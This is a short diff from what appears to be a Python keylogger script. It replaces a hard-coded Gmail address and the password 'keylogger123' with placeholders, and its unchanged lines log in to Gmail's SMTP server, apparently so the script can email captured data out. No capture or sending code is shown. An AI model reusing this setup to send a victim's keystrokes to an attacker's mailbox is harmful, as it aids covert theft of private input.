@@ -15,8 +15,8 @@ print('''
 ''')
 # email
 
-email = "circios00@gmail.com"
-password = "keylogger123"
+email = "youremail@gmail.com"
+password = "yourpassword"
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
